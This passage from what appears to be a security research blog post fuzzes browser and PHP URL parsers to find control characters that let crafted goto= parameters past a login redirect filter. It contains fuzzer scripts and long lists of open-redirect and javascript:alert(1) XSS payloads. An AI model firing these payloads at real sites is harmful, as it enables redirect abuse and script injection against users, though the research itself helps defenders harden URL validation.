+</span></span><span class="line"><span class="cl"><span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="mh">0x10ffff</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">  <span class="k">try</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">url</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="s1">&#39;http:&#39;</span><span class="o">+</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCodePoint</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;//localhost:80/xxxx&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nx">url</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;localhost&#39;</span> <span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">i</span><span class="o">+</span><span class="s1">&#39; URL encoded i : &#39;</span><span class="o">+</span><span class="nb">encodeURI</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCodePoint</span><span class="p">(</span><span class="nx">i</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">log</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">log</span>
+</span></span></code></pre></div><p>Output:</p>
+<pre tabindex="0"><code>9 URL encoded i : %09
+10 URL encoded i : %0A
+13 URL encoded i : %0D
+47 URL encoded i : /
+92 URL encoded i : %5C
+(5) [9, 10, 13, 47, 92]
+</code></pre><p>So how does PHP&rsquo;s URL parser <code>parse_url</code> parse these payloads?</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="p">[</span><span class="s2">&#34;http:%09//localhost&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">array</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;scheme&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="s2">&#34;http&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span> <span class="s2">&#34;%09//localhost&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="s2">&#34;http:   //localhost&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">array</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;scheme&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="s2">&#34;http&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span> <span class="s2">&#34;   //localhost&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="s2">&#34;http:%0a//localhost&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">array</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;scheme&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="s2">&#34;http&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span> <span class="s2">&#34;%0a//localhost&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="s2">&#34;http:\//localhost&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">array</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;scheme&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="s2">&#34;http&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span> <span class="s2">&#34;\//localhost&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="s2">&#34;http:///localhost&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">bool</span><span class="p">(</span><span class="k">false</span><span class="p">)</span>
+</span></span></code></pre></div><p>As you can see, the <code>parse_url</code> faced with these payloads, either thinks that everything after <code>http:</code> is the path portion, or it thinks that the URL is an illegal URL and returns <code>false</code></p>
+<p>In other words, the following payloads can also bypass redacted&rsquo;s URL filter, causing open redirects:</p>
+<pre tabindex="0"><code>https://demo.redacted.com/login?goto=http:\//www.baidu.com
+https://demo.redacted.com/login?goto=http:%0d\\www.baidu.com
+https://demo.redacted.com/login?goto=http:%0a\\www.baidu.com
+https://demo.redacted.com/login?goto=http:%09\\www.baidu.com
+</code></pre>
+
+<h3 class="relative group">Question2: http{char}://localhost:80/xxxx 
+    <div id="question2-httpcharlocalhost80xxxx" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#question2-httpcharlocalhost80xxxx" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Can we find a character between &lsquo;http&rsquo; and &lsquo;://&rsquo; that still makes the front-end URL parser think that the host part of the URL is localhost and the scheme part is http?</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">log</span><span class="o">=</span><span class="p">[];</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="mh">0x10ffff</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">  <span class="k">try</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">url</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="s1">&#39;http&#39;</span><span class="o">+</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCodePoint</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;://localhost:80/xxxx&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nx">url</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;localhost&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">url</span><span class="p">[</span><span class="s1">&#39;protocol&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;http:&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;i: &#39;</span><span class="o">+</span><span class="nx">i</span><span class="o">+</span><span class="s1">&#39; URL encoded i : &#39;</span><span class="o">+</span><span class="nb">encodeURI</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCodePoint</span><span class="p">(</span><span class="nx">i</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">log</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">log</span>
+</span></span></code></pre></div><p>Running results of the front-end URL parser:</p>
+<pre tabindex="0"><code>VM437:7 9:  URL encoded i : %09
+VM437:7 10:  URL encoded i : %0A
+VM437:7 13:  URL encoded i : %0D
+</code></pre><p>This time it only gets three characters, minus <code>/</code>and <code>\</code>, and gets the following three payloads</p>
+<pre tabindex="0"><code>http%09://baidu.com
+http%0a://baidu.com
+http%0d://baidu.com
+</code></pre><p>How does PHP&rsquo;s URL parser parse these payloads?</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">  <span class="p">[</span><span class="s2">&#34;http%09://localhost:80/xxx&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">26</span><span class="p">)</span> <span class="s2">&#34;http%09://localhost:80/xxx&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="s2">&#34;http%0a://localhost:80/xxx&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">26</span><span class="p">)</span> <span class="s2">&#34;http%0a://localhost:80/xxx&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="s2">&#34;http%0d://localhost:80/xxx&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">26</span><span class="p">)</span> <span class="s2">&#34;http%0d://localhost:80/xxx&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span></code></pre></div><p>This bypasses both filter&rsquo;s protocol check and host check:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s1">&#39;http%0a://localhost:80/xxx&#39;</span> <span class="c1">// exception
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s1">&#39;http\n://localhost:80/xxx&#39;</span> <span class="c1">// work
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s1">&#39;javascript\n:alert(1)&#39;</span> <span class="c1">// work
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s1">&#39;javascript\r:alert(1)&#39;</span> <span class="c1">// work
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s1">&#39;javascript\t:alert(1)&#39;</span> <span class="c1">// work
+</span></span></span></code></pre></div><p>payload:</p>
+<pre tabindex="0"><code>https://demo.redacted.com/login?goto=javascript%0d:alert(1) //work！
+https://demo.redacted.com/login?goto=javascript%0a:alert(1) //work！
+https://demo.redacted.com/login?goto=javascript%09:alert(1) //work！
+https://demo.redacted.com/login?goto=http%09://baidu.com //work
+</code></pre>
+
+<h3 class="relative group">Question3: {char}http://localhost:80/xxxx 
+    <div id="question3-charhttplocalhost80xxxx" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#question3-charhttplocalhost80xxxx" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Can we find a character before the &lsquo;http&rsquo; protocol, fill it in, and still make the front-end URL parser think that the host part of the URL is localhost and the scheme part is http?</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">log</span><span class="o">=</span><span class="p">[];</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="mh">0x10ffff</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">  <span class="k">try</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">url</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCodePoint</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;http://localhost:80/xxxx&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nx">url</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;localhost&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">url</span><span class="p">[</span><span class="s1">&#39;protocol&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;http:&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`i: </span><span class="si">${</span><span class="nx">i</span><span class="si">}</span><span class="sb"> ,URL encoded i : `</span><span class="o">+</span><span class="nb">encodeURI</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCodePoint</span><span class="p">(</span><span class="nx">i</span><span class="p">))</span><span class="o">+</span><span class="s1">&#39; string begin:&#39;</span><span class="o">+</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCodePoint</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;string end&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">log</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">log</span>
+</span></span><span class="line"><span class="cl"><span class="nx">log</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">i</span><span class="p">=&gt;{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//console.log(encodeURI(String.fromCodePoint(i))+&#39;http://localhost:80/xxxx&#39;)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">encodeURI</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCodePoint</span><span class="p">(</span><span class="nx">i</span><span class="p">))</span><span class="o">+</span><span class="s1">&#39;javascript:alert(1)&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span></code></pre></div><p>payloads:</p>
+<pre tabindex="0"><code>%00http://localhost:80/xxxx
+%01http://localhost:80/xxxx
+%02http://localhost:80/xxxx
+%03http://localhost:80/xxxx
+%04http://localhost:80/xxxx
+%05http://localhost:80/xxxx
+%06http://localhost:80/xxxx
+%07http://localhost:80/xxxx
+%08http://localhost:80/xxxx
+%09http://localhost:80/xxxx
+%0Ahttp://localhost:80/xxxx
+%0Bhttp://localhost:80/xxxx
+%0Chttp://localhost:80/xxxx
+%0Dhttp://localhost:80/xxxx
+%0Ehttp://localhost:80/xxxx
+%0Fhttp://localhost:80/xxxx
+%10http://localhost:80/xxxx
+%11http://localhost:80/xxxx
+%12http://localhost:80/xxxx
+%13http://localhost:80/xxxx
+%14http://localhost:80/xxxx
+%15http://localhost:80/xxxx
+%16http://localhost:80/xxxx
+%17http://localhost:80/xxxx
+%18http://localhost:80/xxxx
+%19http://localhost:80/xxxx
+%1Ahttp://localhost:80/xxxx
+%1Bhttp://localhost:80/xxxx
+%1Chttp://localhost:80/xxxx
+%1Dhttp://localhost:80/xxxx
+%1Ehttp://localhost:80/xxxx
+%1Fhttp://localhost:80/xxxx
+%20http://localhost:80/xxxx
+</code></pre><p>Replace the http protocol with the javascript protocol:</p>
+<pre tabindex="0"><code>%00javascript:alert(1)
+%01javascript:alert(1)
+%02javascript:alert(1)
+%03javascript:alert(1)
+%04javascript:alert(1)
+%05javascript:alert(1)
+%06javascript:alert(1)
+%07javascript:alert(1)
+%08javascript:alert(1)
+%09javascript:alert(1)
+%0Ajavascript:alert(1)
+%0Bjavascript:alert(1)
+%0Cjavascript:alert(1)
+%0Djavascript:alert(1)
+%0Ejavascript:alert(1)
+%0Fjavascript:alert(1)
+%10javascript:alert(1)
+%11javascript:alert(1)
+%12javascript:alert(1)
+%13javascript:alert(1)
+%14javascript:alert(1)
+%15javascript:alert(1)
+%16javascript:alert(1)
+%17javascript:alert(1)
+%18javascript:alert(1)
+%19javascript:alert(1)
+%1Ajavascript:alert(1)
+%1Bjavascript:alert(1)
+%1Cjavascript:alert(1)
+%1Djavascript:alert(1)
+%1Ejavascript:alert(1)
+%1Fjavascript:alert(1)
+%20javascript:alert(1)
+</code></pre><p>How does PHP&rsquo;s URL parser parse these payloads?</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">  <span class="p">[</span><span class="s2">&#34;%00http://localhost:80/xxxx&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">27</span><span class="p">)</span> <span class="s2">&#34;%00http://localhost:80/xxxx&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="s2">&#34;%01http://localhost:80/xxxx&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">27</span><span class="p">)</span> <span class="s2">&#34;%01http://localhost:80/xxxx&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="s2">&#34;%1Djavascript:alert(1)&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">22</span><span class="p">)</span> <span class="s2">&#34;%1Djavascript:alert(1)&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="s2">&#34;%1Ejavascript:alert(1)&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">22</span><span class="p">)</span> <span class="s2">&#34;%1Ejavascript:alert(1)&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span></code></pre></div><p>PHP&rsquo;s URL parser considers the entire URL to be a relative URL</p>
+<p>Therefore, the following payloads can bypass protocol check and host check of the redacted filter:</p>
+<pre tabindex="0"><code>https://demo.redacted.com/login?goto=%00javascript:alert(1)
+https://demo.redacted.com/login?goto=%01javascript:alert(1)
+https://demo.redacted.com/login?goto=%02javascript:alert(1)
+https://demo.redacted.com/login?goto=%03javascript:alert(1)
+https://demo.redacted.com/login?goto=%04javascript:alert(1)
+https://demo.redacted.com/login?goto=%05javascript:alert(1)
+https://demo.redacted.com/login?goto=%06javascript:alert(1)
+https://demo.redacted.com/login?goto=%07javascript:alert(1)
+https://demo.redacted.com/login?goto=%08javascript:alert(1)
+https://demo.redacted.com/login?goto=%09javascript:alert(1)
+https://demo.redacted.com/login?goto=%0Ajavascript:alert(1)
+https://demo.redacted.com/login?goto=%0Bjavascript:alert(1)
+https://demo.redacted.com/login?goto=%0Cjavascript:alert(1)
+https://demo.redacted.com/login?goto=%0Djavascript:alert(1)
+https://demo.redacted.com/login?goto=%0Ejavascript:alert(1)
+https://demo.redacted.com/login?goto=%0Fjavascript:alert(1)
+https://demo.redacted.com/login?goto=%10javascript:alert(1)
+https://demo.redacted.com/login?goto=%11javascript:alert(1)
+https://demo.redacted.com/login?goto=%12javascript:alert(1)
+https://demo.redacted.com/login?goto=%13javascript:alert(1)
+https://demo.redacted.com/login?goto=%14javascript:alert(1)
+https://demo.redacted.com/login?goto=%15javascript:alert(1)
+https://demo.redacted.com/login?goto=%16javascript:alert(1)
+https://demo.redacted.com/login?goto=%17javascript:alert(1)
+https://demo.redacted.com/login?goto=%18javascript:alert(1)
+https://demo.redacted.com/login?goto=%19javascript:alert(1)
+https://demo.redacted.com/login?goto=%1Ajavascript:alert(1)
+https://demo.redacted.com/login?goto=%1Bjavascript:alert(1)
+https://demo.redacted.com/login?goto=%1Cjavascript:alert(1)
+https://demo.redacted.com/login?goto=%1Djavascript:alert(1)
+https://demo.redacted.com/login?goto=%1Ejavascript:alert(1)
+https://demo.redacted.com/login?goto=%1Fjavascript:alert(1)
+https://demo.redacted.com/login?goto=%20javascript:alert(1)
+</code></pre>
+
+<h3 class="relative group">Question4: ht{char}tp://localhost:80/xxxx 
+    <div id="question4-htchartplocalhost80xxxx" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#question4-htchartplocalhost80xxxx" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Let&rsquo;s be a little more adventurous, can we find a character between <code>ht</code> and <code>tp</code> that the front-end URL parser still thinks the scheme part of the URL is  <code>http</code> and the host part is <code>localhost</code>?</p>
+<p>fuzzer:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">log</span><span class="o">=</span><span class="p">[];</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="mh">0x10ffff</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">  <span class="k">try</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">url</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="s1">&#39;ht&#39;</span><span class="o">+</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCodePoint</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;tp://localhost:80/xxxx&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nx">url</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;localhost&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">url</span><span class="p">[</span><span class="s1">&#39;protocol&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;http:&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;i: &#39;</span><span class="o">+</span><span class="nx">i</span><span class="o">+</span><span class="s1">&#39; URL encoded i : &#39;</span><span class="o">+</span><span class="nb">encodeURI</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCodePoint</span><span class="p">(</span><span class="nx">i</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">log</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">log</span>
+</span></span></code></pre></div><p>Output:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">i</span><span class="o">:</span> <span class="mi">9</span> <span class="nx">URL</span> <span class="nx">encoded</span> <span class="nx">i</span> <span class="o">:</span> <span class="o">%</span><span class="mi">09</span> <span class="kr">debugger</span> <span class="nb">eval</span> <span class="nx">code</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="mi">13</span>
